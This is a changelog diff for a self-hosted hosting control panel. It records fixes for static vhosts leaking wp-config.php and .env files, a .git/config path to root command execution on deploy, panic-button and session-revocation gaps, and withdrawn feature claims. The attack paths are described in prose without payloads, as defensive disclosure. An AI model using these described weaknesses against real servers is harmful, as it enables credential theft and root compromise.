+  published** section naming the auto-filed incidents.
+- The Settings toggle described itself as sharing *"monitor status ... at
+  `/api/status-page`"* — the endpoint nobody visits. It now says it is the master
+  switch for `/status`, that it is off by default, and enumerates what goes
+  public.
+- The status-page **Enabled** checkbox was an unlabelled control on the Incidents
+  screen, absent from the guide's own field list. It is now *"Show /status page"*,
+  documented, and sits under a line stating that nothing is public until the
+  Settings master switch is on.
+- `FEATURES.md` headed its background-services section **"11 supervised"** while
+  `main.rs` derives **15**, and the register 130 lines below it already said 15.
+  Corrected.
+
+## [2.69.0] - 2026-08-05
+
+### Added — a `client` role, and a way to hand a site to one (GitHub #51)
+
+- **`client`** is a new role for a principal who **holds** sites and manages them
+  — mail, PHP version, containers, settings — but **cannot bring a new domain
+  into service**. Requested by an operator migrating from ISPConfig, where this
+  is the ordinary shape.
+- **`POST /api/sites/{id}/transfer`** (admin only) hands a site to another
+  account by email, in one transaction: the `sites` row plus the four tables that
+  keep their own copy of `user_id` beside a `site_id` (`alerts`, `monitors`,
+  `secret_vaults`, `whmcs_service_map`). Everything else a site owns —
+  `databases`, `crons`, `backups` — reaches its owner through `site_id` and
+  follows with no statement of its own.
+- ⚠ **Transfer is exclusive**: the previous owner loses the site. This is
+  ownership, not sharing. Shared management of one domain by two accounts does
+  not exist and is not what this adds.
+
+  Ownership stays a single axis, `sites.user_id`, deliberately. A client who
+  *owns* the row passes all 108 ownership-scoped reads in the backend natively,
+  so none of them had to change. The alternative — widening every read to "owner
+  or delegate" — would have had to keep 57 INSERTs that stamp the acting user in
+  step, and get two name-keyed cleanups right whose own comments record that they
+  already shipped a cross-account delete once.
+
+  The refusal to claim a new domain lives at **one** place:
+  `services::domain_claim::ensure_claimable`, which every domain-introducing path
+  already funnels through. Role checks on the four `INSERT INTO sites` sites
+  would have left three doors open — `git_deploys`, `docker_apps` and `stacks`
+  all materialise a served vhost without ever inserting into `sites`.
+
+- The role selector offers `client` in both the create and edit forms, and the
+  site page grows an admin-only **Transfer** control.
+
+### Fixed — the role a migration and a UI knew about but the write path refused
+
+- `routes/users.rs` carried **three identical copies** of the assignable-role
+  allow-list (create, update, and the un-suspend restore). Adding `client` to the
+  database CHECK and to the user editor still left all three rejecting it. They
+  are now one constant. The restore path was the sharp one: a role missing from
+  that list is silently downgraded to `user` when an account is un-suspended —
+  which would have handed a suspended client back a role that can create sites.
+
+### Security — the static-vhost retrofit, completed
+
+v2.68.0–.2 closed a disclosure where a site switched from PHP to static served
+`wp-config.php`, `.env` and `.git/config` as plain text. Three gaps remained.
+
+- **A disabled site re-enabled into the unpatched body.** `disable_site` backs the
+  vhost up to `sites-available/{domain}.conf.disabled`, and the startup retrofit
+  scans `sites-enabled` for `*.conf` — so the backup fails both tests, and
+  `enable_site` restored it with a plain copy and no re-render. A site switched
+  to static and disabled before the operator upgraded came back **armed**. The
+  restore now patches on the way in, which is the only path by which a disabled
+  body is ever served again.
+- **One PHP deny the static branch did not subsume**:
+  `location ~ ^/sites/.*/private/`. It has no dot segment and no `.php` suffix,
+  so neither static deny covered it, and a Drupal site switched to static served
+  everything under `sites/*/private/` — the directory that exists precisely to
+  hold what Drupal was told not to publish. Verified by serving both configs
+  through a real nginx: 200 with the file's contents before, 403 after, with
+  `/index.html`, Drupal's *public* files and `/.well-known/` all still 200.
+- **The retrofit could report success on a vhost it did not protect.** Candidacy
+  tested `contains("index index.html index.htm;")` (a substring, anywhere) while
+  insertion tested `line.trim() ==` (a whole line), so an index line carrying a
+  trailing comment satisfied one and never the other: the file was rewritten with
+  zero denies added, and the caller — which logs on the write, not on the content
+  — named it as retrofitted. One predicate now decides both.
+- The retrofit also **adds a deny an earlier version missed** instead of skipping
+  a vhost it has already touched, so a box patched by v2.68.2 gains the new one
+  without duplicating the other two.
+
+### Changed — claims this project made and does not back
+
+Corrected on every surface that carried them, including two the audit trail had
+never listed: `COMPARISON.md` and the public site's landing page. `FEATURES.md`
+gains a **Withdrawn Claims** section recording what each said and what is
+actually there, because a claim that merely disappears from one surface tends to
+survive on the others.
+
+- **Teams** — `routes/teams.rs` is 477 lines of working, routed endpoints that
+  grant nothing: `team_members` is read by that file and no other, so no
+  authorization path consults team membership. There is no Teams UI, and the
+  invite email links to an SPA route that does not exist.
+- **API keys** — generated, hashed, stored and handed over with "won't be shown
+  again", and no code path ever reads a stored hash back to authenticate a
+  request. The Settings card and the API reference now say so.
+- **App Migration** — writes one row with `status='in_progress'`; there is no
+  `UPDATE app_migrations` anywhere in the repository. The tab now says it is not
+  implemented rather than pointing at a control that does not exist.
+- **Auto-sleep "scale to zero"** — containers stop and do not come back on their
+  own. Wording corrected; the wake path is a tracked defect.
+
+## [2.68.2] - 2026-08-05
+
+### Security — v2.68.1's retrofit reached the panel host, not the fleet
+
+- **`update.sh` is the panel updater, and an agent-only box never runs it.** Its
+  own header says so: a fleet member has no git repo, no postgres container and no
+  frontend, which is why `agent-self-update.sh` exists and fetches a single binary
+  instead. So v2.68.1's retrofit protected sites on the panel host and left a
+  fleet member's switched site serving `wp-config.php` exactly as before — the same
+  shape as the defect it was fixing, one layer out.
+- **The agent now performs the retrofit itself, at startup.** The agent is the
+  process that owns `/etc/nginx/sites-enabled` on every box it runs on, panel and
+  member alike, so this is the only place the fix reaches the whole population.
+  Same scoping and same idempotence as the script version, and it **declines to
+  run at all when `nginx -t` is already failing** — that check is whole-server, so
+  one unrelated broken vhost would otherwise make the migration revert edits it had
+  made correctly and blame itself for a fault it did not cause. On success it
+  reloads; on failure every file it wrote is restored.
+- The decision is a pure function (`patch_static_vhost`) with unit tests, so
+  "which vhosts qualify" is exercised without a box: a static vhost is patched
+  once and only once, a PHP vhost is skipped (its `.php` location is a *handler* —
+  denying it would stop the site dead), and a proxy vhost is not a candidate.
+  The patched output was served through a real nginx: `403` for `/wp-config.php`
+  and `/.git/config`, `200` for `/index.html`, `/.well-known/` still reaching ACME.
+
+## [2.68.1] - 2026-08-05
+
+### Security — v2.68.0's fix did not reach the sites that already had the problem
+
+- **Updating to v2.68.0 did not protect a site already switched to static.** The
+  fix was to the vhost *template*, and a template reaches a site only when
+  something re-renders its vhost — a runtime switch, an SSL issuance, a settings
+  change. Nothing re-renders on upgrade. So the one site that most needed it, a
+  PHP site switched to static under v2.67.0, kept serving `wp-config.php`, `.env`
+  and `.git/config` after its operator had updated and been told it was fixed.
+- **`update.sh` now retrofits both denies onto static vhosts already on disk.**
+  Scoped by what the vhost *is* — the static branch's `index index.html
+  index.htm;` and no FastCGI handler — so PHP vhosts, which already carry these
+  denies in their preset branch, are untouched. Additive, idempotent, and every
+  edit is validated by `nginx -t` with a per-file rollback: a security retrofit
+  must not be the thing that takes a site down. Verified by migrating a real
+  rendered v2.67.0 static vhost and serving the result through nginx — `403` for
+  `/wp-config.php` and `/.git/config`, `200` for `/index.html`, and `/.well-known/`
+  still reaching the ACME path rather than being denied.
+- ⚠ **The update stops the disclosure; it cannot un-serve what was already
+  fetched.** If a site was static while holding real credentials, treat those
+  credentials as exposed for that window. `grep -iE 'wp-config|\.env|/\.git' /var/log/nginx/<domain>.access.log`
+  shows whether anything asked for them.
+
+## [2.68.0] - 2026-08-05
+
+### Security — switching a site to static published its PHP source
+
+- **A site switched from PHP to static served `wp-config.php`, `.env` and
+  `.git/config` as plain text.** Every one of the twelve `deny all` blocks in the
+  vhost templates lives inside a PHP preset branch; the static branch had a
+  document root, an index and `try_files` and nothing else. That gap was harmless
+  while a static site could only ever hold static files — v2.67.0's runtime switch
+  is what let a document root full of application source become static, and both
+  runtimes resolve to the same `{site_dir}/public`, which is the property that
+  made the switch look safe. Verified by rendering both configs and serving them
+  through nginx: `403` for `/wp-config.php` and `/.git/config` under PHP, `200`
+  with the database password in the response body under static.
+- **The static branch now refuses dotfiles and `.php` source outright**, matching
+  what the PHP presets already did. `/.well-known/` is exempt, so ACME challenges
+  are unaffected. This applies to every static site on its next vhost rebuild, not
+  only to switched ones: a static site that was serving `.php` as plaintext or
+  exposing `.git/` stops doing so.
+- **The switch's warning no longer reassures.** It said the files are not touched
+  and switching back restores execution — both true of execution, neither true of
+  disclosure. It now says what stops being hidden and advises moving anything
+  sensitive out of `public/` first.
+- **A billing webhook can no longer overwrite a privileged role.** `role` doubles
+  as the account status column, so WHMCS `SuspendAccount` overwrote it and
+  `UnsuspendAccount` restored *everyone* to `user`: an admin round-tripped through
+  billing came back as a plain user, with nobody left holding the privilege to
+  promote them again. Reachable because provisioning adopts an existing user by
+  email with no role filter. The suspend now declines to touch `admin`/`reseller`
+  accounts and logs when it does — the panel's own suspend, which stashes the
+  prior role first, is unaffected.
+
+### Changed — the chain-of-trust report no longer certifies what it cannot measure
+
+- **The chain-of-trust PDF/JSON reported `Chain valid: YES` from a constant.**
+  `chain_valid` is written `TRUE` by all seven of its INSERTs, is UPDATEd nowhere,
+  and was read back with `.unwrap_or(true)`; no verifier exists, and none could,
+  because `previous_hash` is copied from the newest row rather than recomputed
+  from the predecessor artifact. The report rendered that constant twice, in bold
+  green, under a footer telling the reader a break "indicates either a missing
+  intermediate backup or a tampered artifact" — a tamper-evidence claim the panel
+  had no mechanism to evaluate, in a document built to hand to an auditor.
+- The report now carries only what the panel genuinely recorded: the SHA-256 and
+  previous-hash values, the verification count and the drill count. Its footer
+  states that hashes are recorded when the backup is taken and not re-computed
+  since. `chain_valid` is no longer rendered, and no longer appears in the
+  `/backup-orchestrator` list responses. The column and its writers are untouched.
+- **The same promise was in the hardening guide, in a stronger form** — *"If an
+  attacker tampers with backup files, the chain breaks and alerts fire."* No code
+  re-computes a hash and no such alert exists, so removing the verdict from the
+  report while leaving that sentence up would have moved the claim rather than
+  retired it. The guide now says what the hashes are for and what they are not, and
+  names the two paths that record no hash at all: site backups created by a
+  schedule or by a policy (2 of the 7 backup INSERTs; database and volume backups
+  do record one).
+
+### Fixed
+
+- **`GET /api/sites/{id}/health-summary` was an unconditional 500.** It selected
+  `last_response_ms` from `monitors`, whose column is `last_response_time` — a
+  `42703` at parse-analyze, so the endpoint had never once returned successfully
+  since it shipped on 2026-03-22. The backend has no compile-checked queries, so
+  only execution could have caught it.
+- **A predecessor backup with no hash was reported as a database error.** The
+  `previous_hash` lookups decoded a nullable column as a non-null `String`, so the
+  ordinary "the previous backup has no hash" case became a decode failure —
+  logged as `DB error fetching previous backup hash` at one site and silently
+  swallowed at the four others. All five now decode it as the nullable value it is.
+
+
+
+### Added — change a site between static and PHP (#99)
+
+- **A site can now be switched between the static and PHP runtimes from its own
+  page.** Reported by HybridRCG: *"I cant seem to find a way to change a site from
+  html to php?"* — the workaround was deleting the site and adding it back. He was
+  not missing a button; nothing in the codebase issued `UPDATE sites SET runtime`,
+  while fourteen other site columns were updatable. `PUT /api/sites/{id}/runtime`
+  rebuilds the full vhost and updates the row, in that order, so a refused nginx
+  write leaves the site describing what is actually being served.
+- **The document root does not move.** `static` and `php` both resolve to
+  `{site_dir}/public`, so existing files keep being served across the switch —
+  `.html` keeps working and `.php` starts executing. Switching back stops
+  execution without touching the files.
+- **Switching to PHP requires an explicit version**, rather than silently reusing
+  the `php_version` a site carried from an earlier life. The picker offers to
+  install a version the server does not have, and the switch is held back until
+  that version is installed *and* its FPM socket is up — the agent already refuses
+  otherwise, waits for the per-site pool socket to appear, and keeps the shared
+  socket rather than pointing nginx at one that does not exist.
+- Deliberately scoped to static⇄PHP. The proxying runtimes (`proxy`, `node`,
+  `python`) resolve their document root to the site directory itself rather than
+  `public/`, so moving to or from them relocates the operator's files — a
+  different change, and not one this control will make by accident: the accepted
+  targets are a closed list.
+
+### Fixed
+
+- **`FEATURES.md` still stamped v2.65.0 after the v2.66.0 release**, so
+  `docs-claims-pin-e2e.sh` was red at `df11639`. v2.66.0 corrected the sibling
+  stamp in `docs/testing.md` and recorded the lesson that counts and stamps are
+  separate edits — while a fifth surface of the same class stayed stale. The
+  suites had been run before the version bump, which is when that arm can pass.
+
+### Changed
+
+- `live-surfaces-check.sh` now asserts that the newest tag actually has a
+  **published release**, not merely that the latest published release is sane.
+  Arm 5 reads `/releases/latest`, which answers with whatever published most
+  recently — so a tag whose release never publishes left every check green while
+  `install.sh`, `install-agent.sh`, `update.sh`, the panel's update banner and the
+  website all kept resolving the previous version. The new arm is age-gated: a tag
+  is only a failure once it is older than the build window, so a release in flight
+  does not turn the run red.
+
+## [2.66.0] - 2026-08-05
+
+### Fixed — the panic button's remaining channels
+
+- **The metrics WebSocket ignored session revocation.** `/api/ws/metrics` decodes
+  its JWT by hand rather than going through the `AuthUser` extractor, and never
+  consulted `sessions_revoked_at`. A stolen admin token could therefore open a
+  **new** socket *after* the panic button was pressed and stream the full process
+  list, network connections and system info every 5 seconds until its own 2-hour
+  expiry — a live view of the operator's incident response, for the intruder it
+  was pressed against. The channel now enforces revocation, with the comparison
+  kept identical to `AuthUser` so the two gates cannot drift.
+- **Panic did not revoke terminal shares.** A share is an unauthenticated public
+  URL holding up to 500KB of terminal output for an hour; lockdown is enforced at
+  the doors and a public GET is not a door. Panic now deletes every share and
+  reports the count. (`revoke_share`/`list_shares` existed, correct and
+  admin-gated, but have never had a frontend caller — so there was no in-panel
+  way to close one.)
+- **The kill report destroyed itself before it could be read.** Panic revokes the
+  pressing admin's own session — correct, since they cannot know theirs is not
+  the stolen one — and both panic screens then called `loadData()`, whose 401
+  hard-navigated to `/login` within one round trip. The operator lost the report,
+  including the "TERMINALS MAY STILL BE RUNNING. Check the server." warning. Both
+  screens now hold the result and redirect on their own terms.
+- **`sessions_revoked` was computed honestly and thrown away.** Both UIs appended
+  "all sessions revoked" unconditionally — the same defect v2.65.0 removed for
+  `terminals_killed: true`, one field to the left. Both now report what the
+  server returned.
+
+### Fixed — a monitoring claim the query could not reach
+
+- **The disk-full forecast could never fire, on any install.**
+  `docs/guides/monitoring.md` advertises an alert when the disk is projected full
+  within 48 hours; `disk_full_forecast()` requires a 6-hour window, and the caller
+  took `LIMIT 60` against a 30-second collector cadence — a ~30-minute window. The
+  query is now bounded by time. Its sibling `memory_leak`, which runs the identical
+  query without the time gate, had fired 7 times over the same period; this had
+  fired zero times, ever. The anti-storm gate it routes through was verified
+  load-bearing before arming it.
+
+### Testing
+
+- `auth-doors-pin-e2e.sh` 28 → 32. **One existing arm was corrected, not added
+  to:** it asserted "panic revokes every issued session, not just the doors" by
+  grepping the panic function for the watermark — a claim about every *reader*,
+  tested against one *writer*. It was green throughout the defect above. It now
+  says `WRITES`, and a new class arm requires every hand-rolled `Claims` decoder
+  outside `auth.rs` to enforce revocation on its own path.
+- `docs-claims-pin-e2e.sh` gains an arm requiring the disk-forecast query to be
+  time-bounded. The existing unit test was correct about the pure function and
+  supplied its own 8-hour trend; nothing measured the caller's window, which is
+  how a dead feature kept a green test and a live doc claim.
+- All 32 suites green at 1081 assertions; the three new defect arms verified red
+  at v2.65.0, each naming its own defect.
+
+## [2.65.0] - 2026-08-05
+
+**The controls you reach for during an incident now do what they say.** Three of
+them did not, and each failed in the direction that reads as safety.
+
+**The panic button could not kill the shell it exists to kill.** It ran
+`pkill -u www-data`, which reaches the sandboxed site terminals and misses the
+*server* terminal — which is deliberately kept as root, and is therefore the one
+shell an intruder is most likely to be holding. It then reset the active-session
+counter to zero without having killed those sessions, which handed whoever was
+there a fresh full quota of terminals. The agent now kills from a registry of the
+shells it actually started, so a server terminal is killed like any other, and
+the counter reaches zero because the sessions are gone rather than by decree.
+
+**And it locked the doors while the intruder was already inside.** Lockdown is
+enforced at login, OAuth, passkey and site creation — all of them doors. Nothing
+tested it against a token that had already been issued, so the stolen admin
+session that produced the root shell kept working for the rest of its two hours,
+and another terminal was one request away. Panic now revokes every issued
+session. This logs the pressing admin out too; during a panic that is the correct
+trade, and an admin can log straight back in while lockdown holds everyone else
+out.
+
+**It also reported success it had not observed.** The call to the agent discarded
+its result and the response asserted `terminals_killed: true` unconditionally, so
+an unreachable agent produced exactly the same reassurance as a successful kill.
+The response now carries what the agent actually reported — how many shells died,
+how many of those were server terminals, and whether the agent was reached at all
+— and the UI says so, loudly, when it was not.
+
+**Settings > Sessions now exists.** The guide has been describing it for a long
+time: a list of your active sessions, each with a Revoke button, and an Export My
+Data download. All three endpoints were already built, correct and scoped to the
+calling user — they simply had no caller anywhere in the frontend. Wiring them
+gives every user self-service revocation of their own devices, which previously
+did not exist at any privilege level: the only session control on the page was
+"Revoke All Sessions", which is admin-only and panel-wide.
+
+**And the guide it came from has been corrected.** `docs/guides/sessions.md` made
+five claims that were not true: an approximate-location column (there is no
+location data in the schema at all), a "Revoke All Other Sessions" button that
+spares your current session (it is panel-wide and logs out every user), session
+binding to the originating IP, and a per-user concurrent-session limit. Neither
+of the last two has ever existed as a setting. The page now says what the code
+does, including the honest bound on what the GDPR export contains.
+
+## [2.64.2] - 2026-08-05
+
+**Security: a compromised site could become root on the next deploy.** 2.64.0
+handed the whole git checkout to `www-data` so PHP-FPM could write it, and 2.64.1
+then told git to accept a repository it no longer owned. Those two together gave
+the application write access to its own `.git`, and git reads a repository's
+`config` and `hooks/` as instruction — so a site under someone else's control
+could have the agent, which runs as root, execute a command of their choosing on
+the next deploy. It needs no hook file and no executable bit: one line appended
+to `.git/config` is enough. Sites deployed from git on the default (non-atomic)
+path are affected; **upgrade before your next deploy.**
+
+The fix keeps both requirements without trading one for the other. The working
+tree still belongs to `www-data`, so applications write their own uploads, caches
+and `.env` exactly as before, and untracked files still survive a deploy. But
+`.git` stays root's, unreadable to anyone else, and the site directory is now
+setgid and sticky so the application cannot unlink the repository and leave one
+of its own in its place. With root owning every repository it touches, git's
+ownership guard is switched back on and the `safe.directory` exceptions are gone.
+
+Two consequences worth stating plainly:
+
+- **A repository that root does not own is discarded and re-cloned, not adopted.**
+  Repairing one in place would mean taking ownership of content the web user
+  wrote and then executing it, which is the same defect with an extra step. Sites
+  deployed under 2.64.0 or 2.64.1 will therefore re-clone once, on their first
+  deploy after upgrading. Nothing untracked is lost.
+- Every git invocation now also runs with hooks and `core.fsmonitor` disabled at
+  command scope, which overrides whatever a repository's own config says. That is
+  what protects the first deploy after upgrading, before the re-clone happens.
+
+Also fixed: a failed `git reset` reported a successful deploy, most reachably when
+a site's branch changes over a checkout holding local commits. And `list_releases`
+can read commit hashes again — atomic-deploy releases have been showing no commit
+hash since the feature shipped, because they were handed to `www-data` too.
+
+## [2.64.1] - 2026-08-05
+
+**A deploy could be made twice.** 2.64.0 fixed the first git deploy of a site and
+broke the second, on the non-atomic path. Found by driving a real box one step
+further than the fix required.
+
+Handing the checkout to `www-data` — which 2.64.0 added so PHP-FPM could write to
+it — leaves the agent, which runs as root, looking at a repository owned by
+somebody else. Git refuses that by design (`detected dubious ownership`), so the
+`fetch` and `reset` of every subsequent deploy failed while the first one still
+succeeded.
+
+Each git invocation now declares the specific directory it is about to use, at
+command scope. The exception is per path — never a wildcard — and command scope
+is required rather than incidental: git deliberately ignores `safe.directory`
+written in a repository's own config, which is the one file an attacker would
+control.
+
+### The same defect, already shipped, in the atomic path
+
+`atomic_deploy` has always chowned its release directory, and two readers ran
+`git rev-parse` against those directories afterwards. Both were silently
+answering "no commit" — so every release listed for an atomic-deploy site has
+been missing its commit hash for as long as the feature has existed. Fixed by
+the same exception.
+
+## [2.64.0] - 2026-08-05
+
+**The first deploy of a site the panel made itself has never worked.**
+
+Creating a site writes a placeholder page into its document root, so the
+directory is never empty. `git clone` refuses a destination that already exists
+and is not empty. Every site created through the panel therefore failed its
+opening git deploy with `fatal: destination path ... already exists and is not
+an empty directory`, and only started working once someone emptied the web root
+by hand.
+
+Atomic deploys were never affected — they build each release in its own
+directory — but atomic deploys are **off by default**, so the path that failed
+is the one a new install actually takes.
+
+### What the failure took with it
+
+The panel runs five things only on a successful deploy, and a deploy that dies
+at the clone reaches none of them: Laravel migrations, the post-deploy health
+check, the completion notification, the deploy-log success record, and the
+auto-injection of vault secrets that 2.63.0 had just repaired. That fix was
+correct and still unreachable on a first deploy.
+
+### The fix, and the two things it is careful about
+
+The clone now goes to a staging directory beside the site and its contents are
+moved into place entry by entry.
+
+- **Files the panel did not write are refused, never deleted.** The placeholder
+  is recognised by its content rather than by its name, so an `index.html` an
+  operator uploaded is not mistaken for ours. A directory holding anything
+  unrecognised stops the deploy and the message names the files that blocked it.
+- **A repository with no `public/` still leaves a document root behind.**
+  Entries the clone does not supply are left alone, so a static or PHP site
+  keeps serving; the deploy log says plainly that the placeholder is still what
+  visitors get, instead of reporting a clean deploy over a page nobody asked for.
+
+### Deploys no longer hand the site to the wrong user
+
+`atomic_deploy` has always chowned its release directory to `www-data`. The
+non-atomic path never did, so a checkout made by the agent stayed owned by root
+and PHP-FPM could not write to it — uploads, caches and generated files all
+failed after a deploy that reported success. Both paths now do the same thing.
+
+## [2.63.0] - 2026-08-04
+
+**The automatic path threw away what the manual path kept.**
+
+Two features had a working half and a silent one. In both cases the button an
+operator clicks did the job correctly, and the unattended path beside it — same
+data, same destination — dropped the result on the floor and had no way to say
+so.
+
+### Auto-injected secrets never arrived, and could not report that they hadn't
+
+A vault secret marked **auto-inject** is supposed to be written into the site's
+environment after every successful git deploy. Since the vault gained its own
+key derivation, that never once happened.
+
+The vault is not encrypted under the JWT secret; it is encrypted under a key
+*derived* from it. Every writer used the derivation, and so does the manual
+**Inject** button — which runs the same query over the same rows and sends the
+same body to the same agent route. The post-deploy path passed the raw JWT
+secret instead, so every decryption failed.
+
+Nothing could report it. AES-GCM is authenticated, so the wrong key cannot
+produce garbage — it produces an error, which was discarded; the list of
+variables then stayed empty, and both the agent call and the only log line sat
+inside a branch that could not be entered. A feature listed in the README, in
+the feature matrix, in its own guide and behind a checkbox in the UI was inert
+and completely silent about it.
+
+Auto-inject now uses the same derivation as every other vault reader, names any
+secret it cannot decrypt, and says so when it injected nothing because none of
+them could be read. An agent that refuses the write is reported too.
+
+### A renewed certificate left the panel describing the retired one
+
+The security scanner renews certificates that are within 30 days of expiry. It
+is the **only** automatic renewal on a stock install, because auto-healing ships
+switched off — and it runs for every host the panel knows, its own included.
+
+It renewed correctly and discarded the new expiry date the agent handed back, so
+`sites.ssl_expiry` kept the value written when the certificate was first issued.
+The dashboard countdown ran down to zero and the expiry alert walked its whole
+warning ladder — 30, 14, 7, 3, 1 day — and then raised **EXPIRED**, at critical
+severity, on a certificate that had renewed perfectly and was serving traffic.
+
+It could not recover on its own, either: that alert resolves only when the days
+remaining *increase*, which cannot happen while nothing rewrites the column.
+Escalation then re-paged it for a week.
+
+The scanner now records what it installed, clearing the renewal-hint columns
+alongside it so the next cycle does not reuse a window computed for the
+certificate it just replaced. When the agent returns an expiry it cannot parse,
+that is now a warning rather than silence.
+
+### A post-renewal lookup keyed on a domain instead of the site
+
+After renewing, the scanner re-read the site to rebuild its full nginx config,
+looking it up by domain. A domain is unique only *per server*, so on a fleet
+that lookup could return a different host's row — and the rebuild it feeds is
+sent to the host being scanned. It now reads the row it already resolved, by id.
+
 ## [2.62.1] - 2026-08-04
 
 Two corrections to v2.62.0, both found auditing that release's own diff.
